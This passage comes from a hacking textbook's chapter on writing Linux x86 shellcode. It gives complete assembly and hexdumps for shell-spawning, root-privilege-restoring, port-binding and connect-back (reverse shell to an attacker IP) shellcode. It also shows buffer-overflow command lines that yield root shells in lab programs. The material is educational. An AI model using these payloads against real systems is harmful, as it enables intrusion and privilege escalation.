logical operations between the two\nOne method is to move an arbitrary 32-bit number into the register and\nthen subtract that value from the register using the mov and sub instructions:\nWhile this technique works, it takes 10 bytes to zero out a single register,\nmaking the assembled shellcode larger than necessary. Can you think of a way\nto optimize this technique? The DWORD value specified in each instruction\nDecrement the target operand by subtracting 1 from it.\nAdd the source operand to the destination operand, storing the result\nSubtract the source operand from the destination operand, storing the\nPerform a bitwise or logic operation, comparing each bit of one\noperand with the corresponding bit of the other operand.\nIf the source bit or the destination bit is on, or if both of them are on, the\nresult bit is on; otherwise, the result is off. The final result is stored in\nPerform a bitwise and logic operation, comparing each bit of one\noperand with the corresponding bit of the other operand.\nThe result bit is on only if both the source bit and the destination bit\nare on. The final result is stored in the destination operand.\nPerform a bitwise exclusive or (xor) logical operation, comparing each\nbit of one operand with the corresponding bit of the other operand.\nIf the bits differ, the result bit is on; if the bits are the same, the result\nbit is off. The final result is stored in the destination operand.\ncomprises 80 percent of the code. Subtracting any value from itself also pro-\nduces 0 and doesn\u2019t require any static data. This can be done with a single\nUsing the sub instruction will work fine when zeroing registers at the\nbeginning of shellcode. This instruction will modify processor flags, which\nare used for branching, however. For that reason, there is a preferred two-\nbyte instruction that is used to zero registers in most shellcode. The xor instruc-\ntion performs an exclusive or operation on the bits in a register. Since 1 xored\nwith 1 results in a 0, and 0 xored with 0 results in a 0, any value xored with itself\nwill result in 0. This is the same result as with any value subtracted from itself,\nbut the xor instruction doesn\u2019t modify processor flags, so it\u2019s considered to be\nYou can safely use the sub instruction to zero registers (if done at the\nbeginning of the shellcode), but the xor instruction is most commonly used\nin shellcode in the wild. This next revision of the shellcode makes use of the\nsmaller registers and the xor instruction to avoid null bytes. The inc and dec\ninstructions have also been used when possible to make for even smaller\nBITS 32             ; Tell nasm this is 32-bit code.\njmp short one       ; Jump down to a call at the end.\n; ssize_t write(int fd, const void *buf, size_t count);\npop ecx           ; Pop the return address (string ptr) into ecx.\nxor eax, eax      ; Zero out full 32 bits of eax register.\nmov al, 4         ; Write syscall #4 to the low byte of eax.\ninc ebx           ; Increment ebx to 1, STDOUT file descriptor.\nint 0x80          ; Do syscall: write(1, string, 14)\nmov al, 1        ; Exit syscall #1, the top 3 bytes are still zeroed.\ndec ebx          ; Decrement ebx back down to 0 for status = 0.\ndb \"Hello, world!\", 0x0a, 0x0d  ; with newline and carriage return bytes.\nAfter assembling this shellcode, hexdump and grep are used to quickly\nreader@hacking:~/booksrc $ hexdump -C helloworld3 | grep --color=auto 00\n00000000  eb 13 59 31 c0 b0 04 31  db 43 31 d2 b2 0f cd 80  |..Y1...1.C1.....|\n00000010  b0 01 4b cd 80 e8 e8 ff  ff ff 48 65 6c 6c 6f 2c  |..K.......Hello,|\n00000020  20 77 6f 72 6c 64 21 0a  0d                       | world!..|\nNow this shellcode is usable, as it doesn\u2019t contain any null bytes. When\nused with an exploit, the notesearch program is coerced into greeting the\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat helloworld3)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\xbc\\xf9\\xff\\xbf\"x40')\nNow that you\u2019ve learned how to make system calls and avoid null bytes, all\nsorts of shellcodes can be constructed. To spawn a shell, we just need to make\na system call to execute the /bin/sh shell program. System call number 11,\nexecve(), is similar to the C execute() function that we used in the previous\nEXECVE(2)                  Linux Programmer's Manual                 EXECVE(2)\nint execve(const char *filename, char *const argv[],\nexecve() executes the program pointed to by filename. Filename must be\neither a binary executable, or a script starting with a line of  the\nform  \"#! interpreter [arg]\". In the latter case, the interpreter must\nbe a valid pathname for an executable which is not itself a  script,\nwhich will be invoked as interpreter [arg] filename.\nargv is an array of argument strings passed to the new program. envp\nis an array of strings, conventionally of the form key=value, which are\npassed as environment to the new program. Both argv and envp must be\nterminated by a null pointer. The argument vector and environment can\nbe accessed by the called program's main function, when it is defined\nThe first argument of the filename should be a pointer to the string\n\"/bin/sh\", since this is what we want to execute. The environment array\u2014\nthe third argument\u2014can be empty, but it still need to be terminated with a\n32-bit null pointer. The argument array\u2014the second argument\u2014must be null-\nterminated, too; it must also contain the string pointer (since the zeroth\nargument is the name of the running program). Done in C, a program\nchar **argv, **envp; // Arrays that contain char pointers\nargv[0] = filename; // The only argument is filename.\nargv[1] = 0;  // Null terminate the argument array.\nenvp[0] = 0; // Null terminate the environment array.\nTo do this in assembly, the argument and environment arrays need to be\nbuilt in memory. In addition, the \"/bin/sh\" string needs to be terminated with\na null byte. This must be built in memory as well. Dealing with memory in\nassembly is similar to using pointers in C. The lea instruction, whose name\nstands for load effective address, works like the address-of operator in C.\nWith Intel assembly syntax, operands can be dereferenced as pointers if\nthey are surrounded by square brackets. For example, the following instruction\nin assembly will treat EBX+12 as a pointer and write eax to where it\u2019s pointing.\nThe following shellcode uses these new instructions to build the execve()\narguments in memory. The environment array is collapsed into the end of\nthe argument array, so they share the same 32-bit null terminator.\nLoad the effective address of the source operand into the destination\njmp short two     ; Jump down to the bottom for the call trick.\n; int execve(const char *filename, char *const argv [], char *const envp[])\npop ebx           ; Ebx has the addr of the string.\nmov [ebx+7], al   ; Null terminate the /bin/sh string.\nmov [ebx+8], ebx  ; Put addr from ebx where the AAAA is.\nmov [ebx+12], eax ; Put 32-bit null terminator where the BBBB is.\nlea ecx, [ebx+8]  ; Load the address of [ebx+8] into ecx for argv ptr.\nlea edx, [ebx+12] ; Edx = ebx + 12, which is the envp ptr.\ncall one          ; Use a call to get string address.\ndb '/bin/shXAAAABBBB'     ; The XAAAABBBB bytes aren't needed.\nAfter terminating the string and building the arrays, the shellcode uses\nthe lea instruction (shown in bold above) to put a pointer to the argument\narray into the ECX register. Loading the effective address of a bracketed\nregister added to a value is an efficient way to add the value to the register\nand store the result in another register. In the example above, the brackets\ndereference EBX+8 as the argument to lea, which loads that address into EDX.\nLoading the address of a dereferenced pointer produces the original pointer,\nso this instruction puts EBX+8 into EDX. Normally, this would require both a\nmov and an add instruction. When assembled, this shellcode is devoid of null\nbytes. It will spawn a shell when used in an exploit.\n00000000  eb 16 5b 31 c0 88 43 07  89 5b 08 89 43 0c 8d 4b  |..[1..C..[..C..K|\n00000010  08 8d 53 0c b0 0b cd 80  e8 e5 ff ff ff 2f 62 69  |..S........../bi|\n00000020  6e 2f 73 68                                       |n/sh|\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat exec_shell)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\xc0\\xf9\\xff\\xbf\"x40')\nThis shellcode, however, can be shortened to less than the current\n45 bytes. Since shellcode needs to be injected into program memory some-\nwhere, smaller shellcode can be used in tighter exploit situations with smaller\nusable buffers. The smaller the shellcode, the more situations it can be used\nin. Obviously, the XAAAABBBB visual aid can be trimmed from the end of the\nstring, which brings the shellcode down to 36 bytes.\nreader@hacking:~/booksrc/shellcodes $ hexdump -C exec_shell\n00000000  eb 16 5b 31 c0 88 43 07  89 5b 08 89 43 0c 8d 4b  |..[1..C..[..C..K|\n00000010  08 8d 53 0c b0 0b cd 80  e8 e5 ff ff ff 2f 62 69  |..S........../bi|\n00000020  6e 2f 73 68                                       |n/sh|\nreader@hacking:~/booksrc/shellcodes $ wc -c exec_shell\nThis shellcode can be shrunk down further by redesigning it and using\nregisters more efficiently. The ESP register is the stack pointer, pointing to\nthe top of the stack. When a value is pushed to the stack, ESP is moved up in\nmemory (by subtracting 4) and the value is placed at the top of the stack.\nWhen a value is popped from the stack, the pointer in ESP is moved down in\nThe following shellcode uses push instructions to build the necessary\n; execve(const char *filename, char *const argv [], char *const envp[])\npush eax          ; Push some nulls for string termination.\nmov ebx, esp      ; Put the address of \"/bin//sh\" into ebx, via esp.\npush eax          ; Push 32-bit null terminator to stack.\nmov edx, esp      ; This is an empty array for envp.\npush ebx          ; Push string addr to stack above null terminator.\nmov ecx, esp      ; This is the argv array with string ptr.\nThis shellcode builds the null-terminated string \"/bin//sh\" on the stack,\nand then copies ESP for the pointer. The extra backslash doesn\u2019t matter and\nis effectively ignored. The same method is used to build the arrays for the\nremaining arguments. The resulting shellcode still spawns a shell but is only\n25 bytes, compared to 36 bytes using the jmp call method.\n00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 50  |1.Ph//shh/bin..P|\n00000010  89 e2 53 89 e1 b0 0b cd  80                       |..S......|\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\xcb\\xf9\\xff\\xbf\"x40')\nTo help mitigate rampant privilege escalation, some privileged processes will\nlower their effective privileges while doing things that don\u2019t require that kind\nof access. This can be done with the seteuid() function, which will set the effec-\ntive user ID. By changing the effective user ID, the privileges of the process\ncan be changed. The manual page for the seteuid() function is shown below.\nSETEGID(2)                 Linux Programmer's Manual                SETEGID(2)\nseteuid() sets the effective user ID of the current process.\nUnprivileged user processes may only set the effective user ID to\nID to the real user ID, the effective user ID or the saved set-user-ID.\nPrecisely the same holds for setegid() with \"group\" instead of \"user\".\nOn success, zero is returned. On error, -1 is returned, and errno is\nThis function is used by the following code to drop privileges down to\nthose of the \u201cgames\u201d user before the vulnerable strcpy() call.\nvoid lowered_privilege_function(unsigned char *ptr) {\nEven though this compiled program is setuid root, the privileges are\ndropped to the games user before the shellcode can execute. This only\nspawns a shell for the games user, without root access.\nreader@hacking:~/booksrc $ gcc -o drop_privs drop_privs.c\nreader@hacking:~/booksrc $ sudo chown root ./drop_privs; sudo chmod u+s ./drop_privs\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs\nreader@hacking:~/booksrc $ ./drop_privs $(perl -e 'print \"\\xcb\\xf9\\xff\\xbf\"x40')\ngroups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scan\nner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)\nFortunately, the privileges can easily be restored at the beginning of our\nshellcode with a system call to set the privileges back to root. The most com-\nplete way to do this is with a setresuid() system call, which sets the real,\neffective, and saved user IDs. The system call number and manual page are\nreader@hacking:~/booksrc $ grep -i setresuid /usr/include/asm-i386/unistd.h\nSETRESUID(2)               Linux Programmer's Manual              SETRESUID(2)\nsetresuid, setresgid - set real, effective and saved user or group ID\nsetresuid() sets the real user ID, the effective user ID, and the saved\nThe following shellcode makes a call to setresuid() before spawning the\nint 0x80          ; setresuid(0, 0, 0)  Restore all root privs.\n; execve(const char *filename, char *const argv [], char *const envp[])\npush ecx          ; push some nulls for string termination.\nmov ebx, esp      ; Put the address of \"/bin//sh\" into ebx via esp.\npush ecx          ; push 32-bit null terminator to stack.\nmov edx, esp      ; This is an empty array for envp.\npush ebx          ; push string addr to stack above null terminator.\nmov ecx, esp      ; This is the argv array with string ptr.\nint 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nThis way, even if a program is running under lowered privileges when it\u2019s\nexploited, the shellcode can restore the privileges. This effect is demonstrated\nbelow by exploiting the same program with dropped privileges.\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat priv_shell)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs\nreader@hacking:~/booksrc $ ./drop_privs $(perl -e 'print \"\\xbf\\xf9\\xff\\xbf\"x40')\ngroups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scan\nner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)\nA few more bytes can still be shaved off this shellcode. There is a single-byte\nx86 instruction called cdq, which stands for convert doubleword to quadword.\nInstead of using operands, this instruction always gets its source from the\nEAX register and stores the results between the EDX and EAX registers. Since\nthe registers are 32-bit doublewords, it takes two registers to store a 64-bit\nquadword. The conversion is simply a matter of extending the sign bit from a\n32-bit integer to 64-bit integer. Operationally, this means if the sign bit of EAX\nis 0, the cdq instruction will zero the EDX register. Using xor to zero the EDX\nregister requires two bytes; so, if EAX is already zeroed, using the cdq instruction\nAnother byte can be saved with clever use of the stack. Since the stack is\n32-bit aligned, a single byte value pushed to the stack will be aligned as a\ndoubleword. When this value is popped off, it will be sign-extended, filling\nthe entire register. The instructions that push a single byte and pop it back\ninto a register take three bytes, while using xor to zero the register and moving\nThese tricks (shown in bold) are used in the following shellcode listing.\nThis assembles into the same shellcode as that used in the previous chapters.\ncdq               ; Zero out edx using the sign bit from eax.\nint 0x80          ; setresuid(0, 0, 0)  Restore all root privs.\n; execve(const char *filename, char *const argv [], char *const envp[])\npush ecx          ; push some nulls for string termination.\nmov ebx, esp      ; Put the address of \"/bin//sh\" into ebx via esp.\npush ecx          ; push 32-bit null terminator to stack.\nmov edx, esp      ; This is an empty array for envp.\npush ebx          ; push string addr to stack above null terminator.\nmov ecx, esp      ; This is the argv array with string ptr.\nint 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nThe syntax for pushing a single byte requires the size to be declared.\nValid sizes are BYTE for one byte, WORD for two bytes, and DWORD for four bytes.\nThese sizes can be implied from register widths, so moving into the AL\nregister implies the BYTE size. While it\u2019s not necessary to use a size in all\nsituations, it doesn\u2019t hurt and can help readability.\nWhen exploiting a remote program, the shellcode we\u2019ve designed so far won\u2019t\nwork. The injected shellcode needs to communicate over the network to\ndeliver an interactive root prompt. Port-binding shellcode will bind the shell\nto a network port where it listens for incoming connections. In the previous\nchapter, we used this kind of shellcode to exploit the tinyweb server. The\nfollowing C code binds to port 31337 and listens for a TCP connection.\nint sockfd, new_sockfd;  // Listen on sock_fd, new connection on new_fd\nstruct sockaddr_in host_addr, client_addr;   // My address information\nhost_addr.sin_family = AF_INET;         // Host byte order\nhost_addr.sin_port = htons(31337);      // Short, network byte order\nhost_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.\nmemset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\nbind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));\nnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\nThese familiar socket functions can all be accessed with a single Linux\nsystem call, aptly named socketcall(). This is syscall number 102, which has a\nreader@hacking:~/booksrc $ grep socketcall /usr/include/asm-i386/unistd.h\nIPC(2)                     Linux Programmer's Manual                     IPC(2)\nsocketcall() is a common kernel entry point for the socket system calls. call\ndetermines which socket function to invoke. args points to a block containing\nthe actual arguments, which are passed through to the appropriate call.\nUser programs should call  the  appropriate  functions  by  their  usual\nnames.   Only  standard  library implementors and kernel hackers need to\nThe possible call numbers for the first argument are listed in the\n#define SYS_GETSOCKNAME 6   /* sys_getsockname(2)   */\n#define SYS_GETPEERNAME 7   /* sys_getpeername(2)   */\n#define SYS_SOCKETPAIR  8   /* sys_socketpair(2)    */\n#define SYS_RECVFROM  12    /* sys_recvfrom(2)    */\n#define SYS_SHUTDOWN  13    /* sys_shutdown(2)    */\n#define SYS_SETSOCKOPT  14    /* sys_setsockopt(2)    */\n#define SYS_GETSOCKOPT  15    /* sys_getsockopt(2)    */\nSo, to make socket system calls using Linux, EAX is always 102 for\nsocketcall(), EBX contains the type of socket call, and ECX is a pointer to\nthe socket call\u2019s arguments. The calls are simple enough, but some of them\nrequire a sockaddr structure, which must be built by the shellcode. Debugging\nthe compiled C code is the most direct way to look at this structure in memory.\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n13         sockfd = socket(PF_INET, SOCK_STREAM, 0);\n15         host_addr.sin_family = AF_INET;         // Host byte order\n16         host_addr.sin_port = htons(31337);      // Short, network byte order\n17         host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.\n18         memset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\n20         bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));\nBreakpoint 1 at 0x804849b: file bind_port.c, line 13.\nBreakpoint 2 at 0x80484f5: file bind_port.c, line 20.\n13         sockfd = socket(PF_INET, SOCK_STREAM, 0);\n0x804849b <main+23>:    mov    DWORD PTR [esp+8],0x0\n0x80484a3 <main+31>:    mov    DWORD PTR [esp+4],0x1\n0x80484b2 <main+46>:    call   0x8048394 <socket@plt>\n0x80484b7 <main+51>:    mov    DWORD PTR [ebp-12],eax\nThe first breakpoint is just before the socket call happens, since we\nneed to check the values of PF_INET and SOCK_STREAM. All three arguments are\npushed to the stack (but with mov instructions) in reverse order. This means\n20         bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));\n$1 = {sin_family = 2, sin_port = 27002, sin_addr = {s_addr = 0},\n0xbffff780:     0x02    0x00    0x7a    0x69    0x00    0x00    0x00    0x00\n0xbffff788:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\nThe next breakpoint happens after the sockaddr structure is filled with\nvalues. The debugger is smart enough to decode the elements of the structure\nwhen host_addr is printed, but now you need to be smart enough to realize the\nport is stored in network byte order. The sin_family and sin_port elements are\nboth words, followed by the address as a DWORD. In this case, the address is 0,\nwhich means any address can be used for binding. The remaining eight bytes\nafter that are just extra space in the structure. The first eight bytes in the\nstructure (shown in bold) contain all the important information.\nThe following assembly instructions perform all the socket calls needed\nto bind to port 31337 and accept TCP connections. The sockaddr structure and\nthe argument arrays are each created by pushing values in reverse order to the\nstack and then copying ESP into ECX. The last eight bytes of the sockaddr\nstructure aren\u2019t actually pushed to the stack, since they aren\u2019t used. Whatever\nrandom eight bytes happen to be on the stack will occupy this space, which\npush BYTE 0x66    ; socketcall is syscall #102 (0x66).\ncdq               ; Zero out edx for use as a null DWORD later.\npush edx          ; Build arg array: { protocol = 0,\npush BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,\npush BYTE 0x2     ;                    AF_INET = 2 }\nint 0x80          ; After syscall, eax has socket file descriptor.\nmov esi, eax      ; save socket FD in esi for later\npush edx          ; Build sockaddr struct:  INADDR_ANY = 0\npush WORD 0x697a  ;   (in reverse order)    PORT = 31337\npush WORD bx      ;                         AF_INET = 2\npush BYTE 16      ; argv: { sizeof(server struct) = 16,\npush esi          ;         socket file descriptor }\ninc ebx           ; ebx = 4 = SYS_LISTEN = listen()\ninc ebx           ; ebx = 5 = SYS_ACCEPT = accept()\nWhen assembled and used in an exploit, this shellcode will bind to\nport 31337 and wait for an incoming connection, blocking at the accept call.\nWhen a connection is accepted, the new socket file descriptor is put into EAX\nat the end of this code. This won\u2019t really be useful until it\u2019s combined with\nthe shell-spawning code described earlier. Fortunately, standard file descrip-\nStandard input, standard output, and standard error are the three standard\nfile descriptors used by programs to perform standard I/O. Sockets, too, are\njust file descriptors that can be read from and written to. By simply swapping\nthe standard input, output, and error of the spawned shell with the connected\nsocket file descriptor, the shell will write output and errors to the socket and\nread its input from the bytes that the socket received. There is a system call\nspecifically for duplicating file descriptors, called dup2. This is system call\nreader@hacking:~/booksrc $ grep dup2 /usr/include/asm-i386/unistd.h\nDUP(2)                     Linux Programmer's Manual                     DUP(2)\ndup() and dup2() create a copy of the file descriptor oldfd.\ndup2() makes newfd be the copy of oldfd, closing newfd first if necessary.\nThe bind_port.s shellcode left off with the connected socket file descriptor\nin EAX. The following instructions are added in the file bind_shell_beta.s to\nduplicate this socket into the standard I/O file descriptors; then, the tiny_shell\ninstructions are called to execute a shell in the current process. The spawned\nshell\u2019s standard input and output file descriptors will be the TCP connection,\n; dup2(connected socket, {all three standard I/O file descriptors})\n; execve(const char *filename, char *const argv [], char *const envp[])\npush edx          ; push some nulls for string termination.\nmov ebx, esp      ; Put the address of \"/bin//sh\" into ebx via esp.\npush ecx          ; push 32-bit null terminator to stack.\nmov edx, esp      ; This is an empty array for envp.\npush ebx          ; push string addr to stack above null terminator.\nmov ecx, esp      ; This is the argv array with string ptr.\nint 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nWhen this shellcode is assembled and used in an exploit, it will bind to\nport 31337 and wait for an incoming connection. In the output below, grep\nis used to quickly check for null bytes. At the end, the process hangs waiting\nreader@hacking:~/booksrc $ hexdump -C bind_shell_beta | grep --color=auto 00\n00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|\n00000010  89 c6 6a 66 58 43 52 66  68 7a 69 66 53 89 e1 6a  |..jfXCRfhzifS..j|\n00000020  10 51 56 89 e1 cd 80 b0  66 43 43 53 56 89 e1 cd  |.QV.....fCCSV...|\n00000030  80 b0 66 43 52 52 56 89  e1 cd 80 89 c3 6a 3f 58  |..fCRRV......j?X|\n00000040  31 c9 cd 80 b0 3f 41 cd  80 b0 3f 41 cd 80 b0 0b  |1....?A...?A....|\n00000050  52 68 2f 2f 73 68 68 2f  62 69 6e 89 e3 52 89 e2  |Rh//shh/bin..R..|\n00000060  53 89 e1 cd 80                                    |S....|\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat bind_shell_beta)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x7f\\xf9\\xff\\xbf\"x40')\nFrom another terminal window, the program netstat is used to find the\nlistening port. Then, netcat is used to connect to the root shell on that port.\nreader@hacking:~/booksrc $ sudo netstat -lp | grep 31337\ntcp        0      0   *:31337          *:*            LISTEN     25604/notesearch\nThe control structures of the C programming language, such as for loops\nand if-then-else blocks, are made up of conditional branches and loops in the\nmachine language. With control structures, the repeated calls to dup2 could be\nshrunk down to a single call in a loop. The first C program written in previous\nchapters used a for loop to greet the world 10 times. Disassembling the main\nfunction will show us how the compiler implemented the for loop using assem-\nbly instructions. The loop instructions (shown below in bold) come after the\nfunction prologue instructions save stack memory for the local variable i.\nThis variable is referenced in relation to the EBP register as [ebp-4].\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n0x08048384 <main+16>:   mov    DWORD PTR [ebp-4],0x0\n0x0804838b <main+23>:   cmp    DWORD PTR [ebp-4],0x9\n0x08048393 <main+31>:   mov    DWORD PTR [esp],0x8048484\n0x0804839a <main+38>:   call   0x80482a0 <printf@plt>\nThe loop contains two new instructions: cmp (compare) and jle (jump if\nless than or equal to), the latter belonging to the family of conditional jump\ninstructions. The cmp instruction will compare its two operands, setting flags\nbased on the result. Then, a conditional jump instruction will jump based on\nthe flags. In the code above, if the value at [ebp-4] is less than or equal to 9,\nexecution will jump to 0x8048393, past the next jmp instruction. Otherwise, the\nnext jmp instruction brings execution to the end of the function at 0x080483a6,\nexiting the loop. The body of the loop makes the call to printf(), increments\nthe counter variable at [ebp-4], and finally jumps back to the compare instruc-\ntion to continue the loop. Using conditional jump instructions, complex\nprogramming control structures such as loops can be created in assembly.\nMore conditional jump instructions are shown below.\nThese instructions can be used to shrink the dup2 portion of the shellcode\n; dup2(connected socket, {all three standard I/O file descriptors})\nCompare the destination operand with the source, setting flags for use\nJump if not greater than, or not greater than or equal to.\nThis loop iterates ECX from 0 to 2, making a call to dup2 each time. With\na more complete understanding of the flags used by the cmp instruction, this\nloop can be shrunk even further. The status flags set by the cmp instruction are\nalso set by most other instructions, describing the attributes of the instruction\u2019s\nresult. These flags are carry flag (CF), parity flag (PF), adjust flag (AF), over-\nflow flag (OF), zero flag (ZF), and sign flag (SF). The last two flags are the\nmost useful and the easiest to understand. The zero flag is set to true if the\nresult is zero, otherwise it is false. The sign flag is simply the most significant\nbit of the result, which is true if the result is negative and false otherwise.\nThis means that, after any instruction with a negative result, the sign flag\nThe cmp (compare) instruction is actually just a sub (subtract) instruction\nthat throws away the results, only affecting the status flags. The jle (jump if\nless than or equal to) instruction is actually checking the zero and sign flags.\nIf either of these flags is true, then the destination (first) operand is less than\nor equal to the source (second) operand. The other conditional jump instruc-\ntions work in a similar way, and there are still more conditional jump\ninstructions that directly check individual status flags:\nWith this knowledge, the cmp (compare) instruction can be removed\nentirely if the loop\u2019s order is reversed. Starting from 2 and counting down,\nthe sign flag can be checked to loop until 0. The shortened loop is shown\n; dup2(connected socket, {all three standard I/O file descriptors})\njns dup_loop      ; If the sign flag is not set, ecx is not negative.\nTrue if the result is negative (equal to the most significant bit of result).\nThe first two instructions before the loop can be shortened with the xchg\n(exchange) instruction. This instruction swaps the values between the source\nThis single instruction can replace both of the following instructions,\nThe EAX register needs to be zeroed to clear only the upper three bytes\nof the register, and EBX already has these upper bytes cleared. So swapping\nthe values between EAX and EBX will kill two birds with one stone, reduc-\ning the size to the following single-byte instruction:\nSince the xchg instruction is actually smaller than a mov instruction between\ntwo registers, it can be used to shrink shellcode in other places. Naturally, this\nonly works in situations where the source operand\u2019s register doesn\u2019t matter.\nThe following version of the bind port shellcode uses the exchange instruction\npush BYTE 0x66    ; socketcall is syscall #102 (0x66).\ncdq               ; Zero out edx for use as a null DWORD later.\npush edx          ; Build arg array: { protocol = 0,\npush BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,\npush BYTE 0x2     ;                    AF_INET = 2 }\nint 0x80          ; After syscall, eax has socket file descriptor.\nxchg esi, eax     ; Save socket FD in esi for later.\npush edx          ; Build sockaddr struct:  INADDR_ANY = 0\npush WORD 0x697a  ;   (in reverse order)    PORT = 31337\npush WORD bx      ;                         AF_INET = 2\npush BYTE 16      ; argv: { sizeof(server struct) = 16,\npush esi          ;         socket file descriptor }\ninc ebx           ; ebx = 4 = SYS_LISTEN = listen()\ninc ebx           ; ebx = 5 = SYS_ACCEPT = accept()\n; dup2(connected socket, {all three standard I/O file descriptors})\nxchg eax, ebx     ; Put socket FD in ebx and 0x00000005 in eax.\njns dup_loop      ; If the sign flag is not set, ecx is not negative.\n; execve(const char *filename, char *const argv [], char *const envp[])\npush edx          ; push some nulls for string termination.\nmov ebx, esp      ; Put the address of \"/bin//sh\" into ebx via esp.\npush edx          ; push 32-bit null terminator to stack.\nmov edx, esp      ; This is an empty array for envp.\npush ebx          ; push string addr to stack above null terminator.\nmov ecx, esp      ; This is the argv array with string ptr\nint 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nThis assembles to the same 92-byte bind_shell shellcode used in the\n00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|\n00000010  96 6a 66 58 43 52 66 68  7a 69 66 53 89 e1 6a 10  |.jfXCRfhzifS..j.|\n00000020  51 56 89 e1 cd 80 b0 66  43 43 53 56 89 e1 cd 80  |QV.....fCCSV....|\n00000030  b0 66 43 52 52 56 89 e1  cd 80 93 6a 02 59 b0 3f  |.fCRRV.....j.Y.?|\n00000040  cd 80 49 79 f9 b0 0b 52  68 2f 2f 73 68 68 2f 62  |..Iy...Rh//shh/b|\n00000050  69 6e 89 e3 52 89 e2 53  89 e1 cd 80              |in..R..S....|\nreader@hacking:~/booksrc $ diff bind_shell portbinding_shellcode\nPort-binding shellcode is easily foiled by firewalls. Most firewalls will block\nincoming connections, except for certain ports with known services. This limits\nthe user\u2019s exposure and will prevent port-binding shellcode from receiving a\nconnection. Software firewalls are now so common that port-bind shellcode\nHowever, firewalls typically do not filter outbound connections, since that\nwould hinder usability. From inside the firewall, a user should be able to access\nany web page or make any other outbound connections. This means that if\nthe shellcode initiates the outbound connection, most firewalls will allow it.\nInstead of waiting for a connection from an attacker, connect-back shell-\ncode initiates a TCP connection back to the attacker\u2019s IP address. Opening a\nTCP connection only requires a call to socket() and a call to connect(). This is\nvery similar to the bind-port shellcode, since the socket call is exactly the same\nand the connect() call takes the same type of arguments as bind(). The following\nconnect-back shellcode was made from the bind-port shellcode with a few\npush BYTE 0x66    ; socketcall is syscall #102 (0x66).\ncdq               ; Zero out edx for use as a null DWORD later.\npush edx          ; Build arg array: { protocol = 0,\npush BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,\npush BYTE 0x2     ;                    AF_INET = 2 }\nint 0x80          ; After syscall, eax has socket file descriptor.\nxchg esi, eax     ; Save socket FD in esi for later.\npush DWORD 0x482aa8c0 ; Build sockaddr struct: IP address = 192.168.42.72\npush WORD 0x697a  ;   (in reverse order)    PORT = 31337\npush WORD bx      ;                         AF_INET = 2\npush BYTE 16      ; argv: { sizeof(server struct) = 16,\npush esi          ;         socket file descriptor }\ninc ebx           ; ebx = 3 = SYS_CONNECT = connect()\n; dup2(connected socket, {all three standard I/O file descriptors})\nxchg eax, ebx     ; Put socket FD in ebx and 0x00000003 in eax.\njns dup_loop      ; If the sign flag is not set, ecx is not negative.\n; execve(const char *filename, char *const argv [], char *const envp[])\npush edx          ; push some nulls for string termination.\nmov ebx, esp      ; Put the address of \"/bin//sh\" into ebx via esp.\npush edx          ; push 32-bit null terminator to stack.\nmov edx, esp      ; This is an empty array for envp.\npush ebx          ; push string addr to stack above null terminator.\nmov ecx, esp      ; This is the argv array with string ptr.\nint 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nIn the shellcode above, the connection IP address is set to 192.168.42.72,\nwhich should be the IP address of the attacking machine. This address is stored\nin the in_addr structure as 0x482aa8c0, which is the hexadecimal representa-\ntion of 72, 42, 168, and 192. This is made clear when each number is displayed\nSince these values are stored in network byte order but the x86 archi-\ntecture is in little-endian order, the stored DWORD seems to be reversed. This\nmeans the DWORD for 192.168.42.72 is 0x482aa8c0. This also applies for the\ntwo-byte WORD used for the destination port. When the port number 31337\nis printed in hexadecimal using gdb, the byte order is shown in little-endian\norder. This means the displayed bytes must be reversed, so WORD for 31337\nThe netcat program can also be used to listen for incoming connections\nwith the -l command-line option. This is used in the output below to listen\non port 31337 for the connect-back shellcode. The ifconfig command ensures\nthe IP address of eth0 is 